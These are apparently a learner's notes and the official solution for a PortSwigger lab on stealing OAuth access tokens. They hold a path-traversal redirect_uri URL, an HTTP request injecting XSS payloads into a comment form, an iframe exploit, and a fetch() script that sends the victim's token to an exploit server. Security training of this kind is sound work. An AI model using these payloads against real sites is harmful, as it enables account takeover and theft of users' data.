Path Traversial

```
https://oauth-0a78003d0399b33980e03336028f0010.oauth-server.net/auth?client_id=xp2jx85eak8ui2zisq149&redirect_uri=https://0a74006c03bdb3ab80c435a800f800dd.web-security-academy.net/oauth-callback/../../post?postId=10&response_type=token&nonce=1960647069&scope=openid%20profile%20email
```

Open redirect By embeded link
```
POST /post/comment HTTP/2
Host: 0a74006c03bdb3ab80c435a800f800dd.web-security-academy.net
Cookie: session=POqtUTpAXyDqr0lqiIjLEQ2zPda5mI3m
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a74006c03bdb3ab80c435a800f800dd.web-security-academy.net/post?postId=10
Content-Type: text/plain;charset=UTF-8
Content-Length: 239
Origin: https://0a74006c03bdb3ab80c435a800f800dd.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

comment=<script>onload=alert(1)</script>&name=<script>onload=alert(1)</script>&email=test@ttes.com&website=<h1>https://exploit-0aaa00bc03b1b35c808234f901a80058.exploit-server.net/exploit</h1>&postId=10&csrf=KueDRs3DUPAg8PDlLOlzJDHbcC7LTnMi
```

Solution 

1. Study the OAuth flow while proxying traffic through Burp. Using the same method as in the [previous lab](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect), identify that the `redirect_uri` is vulnerable to [directory traversal](https://portswigger.net/web-security/file-path-traversal). This enables you to redirect access tokens to arbitrary pages on the blog website.
2. Using Burp, audit the other pages on the blog website. Observe that the comment form is included as an `iframe` on each blog post. Look closer at the `/post/comment/comment-form` page in Burp and notice that it uses the `postMessage()` method to send the `window.location.href` property to its parent window. Crucially, it allows messages to be posted to any origin (`*`).
3. From the proxy history, right-click on the `GET /auth?client_id=[...]` request and select "Copy URL". Go to the exploit server and create an `iframe` in which the `src` attribute is the URL you just copied. Use directory traversal to change the `redirect_uri` so that it points to the comment form. The result should look something like this:
    
    `<iframe src="https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT_ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-1552239120&scope=openid%20profile%20email"></iframe>`
    
1. Below this, add a suitable script that will listen for web messages and output the contents somewhere. For example, you can use the following script to reveal the web message in the exploit server's access log:
    
    `<script> window.addEventListener('message', function(e) { fetch("/" + encodeURIComponent(e.data.data)) }, false) </script>`
    
1. To check the exploit is working, store it and then click "View exploit". Make sure that the `iframe` loads then go to the exploit server's access log. There should be a request for which the path is the full URL of the comment form, along with a fragment containing the access token.
2. Go back to the exploit server and deliver this exploit to the victim. Copy their access token from the log. Make sure you don't accidentally include any of the surrounding URL-encoded characters.
3. Send the `GET /me` request to Burp Repeater. In Repeater, replace the token in the `Authorization: Bearer` header with the one you just copied and send the request. Observe that you have successfully made an API call to fetch the victim's data, including their API key.
4. Use the "Submit solution" button at the top of the lab page to submit the stolen key and solve the lab.